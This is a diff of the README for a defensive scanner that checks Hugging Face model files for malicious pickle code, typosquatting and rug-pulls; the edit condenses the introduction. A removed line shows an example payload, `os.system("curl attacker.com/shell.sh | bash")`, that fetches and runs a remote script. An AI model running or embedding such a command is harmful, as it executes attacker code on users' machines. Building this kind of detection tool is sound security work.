@@ -1,41 +1,25 @@
 # HF Model Provenance Scanner
 
-**Detect pickle exploits, supply-chain manipulation, and provenance gaps in Hugging Face models without downloading full weights.**
+Static analysis for Hugging Face models. Detects pickle exploits, supply-chain manipulation, and provenance gaps by fetching only file headers (8-64 KB) via HTTP Range requests. Never downloads full weights.
 
 ---
 
-## The Problem in 30 Seconds
+## What This Does
 
-You `pip install transformers` and call `AutoModel.from_pretrained("some-model")`. Behind the scenes, Python deserializes a pickle file. That pickle file can execute arbitrary code on your machine the moment it loads. No sandbox. No warning. Just `os.system("curl attacker.com/shell.sh | bash")` encoded in a byte stream.
+When you call `AutoModel.from_pretrained("some-model")`, Python deserializes a pickle file that can execute arbitrary code on load. In January 2024, researchers found Hub models with live reverse shells embedded in pickle opcodes, typosquatted to look like popular models. Thousands of downloads before detection.
 
-In January 2024, researchers found models on the Hugging Face Hub with live reverse shells embedded in pickle opcodes. The model names were one character off from popular models (typosquatting). Thousands of downloads before detection.
-
-This scanner catches that attack, and several others that existing tools miss, by fetching only the first 8-64 KB of each file via HTTP Range requests. It never downloads model weights. A full scan of bert-base-uncased costs about 0.5 MB of bandwidth and completes in seconds.
+I built this scanner because existing tools (like ModelScan) require downloading entire model files, miss importlib-based bypasses, and don't catch supply-chain attacks. This one fetches the first 8-64 KB of each file via Range requests, runs a taint-tracking pickle opcode analyzer, checks for typosquatting and rug-pulls, and outputs SARIF or CycloneDX SBOM. A full scan of bert-base-uncased costs about 0.5 MB of bandwidth and takes seconds.
 
 ---
 
-## Executive Summary
+## What It Checks
 
-This tool is for ML engineers, platform security teams, and DevSecOps practitioners who deploy or serve Hugging Face models. It answers a simple question: **is this model safe to load?**
-
-It performs static analysis of model file headers, detects obfuscated pickle gadget chains, identifies supply-chain manipulation (typosquatting, rug-pulls, impersonation), and produces machine-readable output (SARIF, CycloneDX SBOM) for integration with CI pipelines and security dashboards.
-
-If you run models from the Hub in production, this gives you a gate between "someone uploaded a file" and "your infrastructure executes it."
-
----
-
-## Why This Repository Exists
-
-Existing tools (notably ModelScan by Protect AI) require downloading entire model files, miss importlib-based bypasses, and don't detect supply-chain manipulation. This scanner was built to close those gaps.
-
-**Questions this repo answers:**
-
-- Does this model contain pickle opcodes that execute code on deserialization?
-- Is the model name suspiciously similar to a popular model (typosquatting)?
-- Have the model files changed since last scan without a version bump (rug-pull)?
-- Does the model have cryptographic provenance (who published it, when, is it signed)?
-- Can I generate an SBOM and SARIF report for compliance and audit workflows?
-- Can I block malicious models at runtime before `torch.load()` executes them?
+- Pickle opcodes that execute code on deserialization (including obfuscated gadget chains)
+- Model name similarity to popular models (typosquatting detection)
+- File changes since last scan without version bumps (rug-pull detection)
+- Cryptographic provenance (publisher identity, signing status)
+- SBOM and SARIF generation for compliance workflows
+- Runtime blocking hook for `torch.load()` as a last-resort gate
 
 ---
 
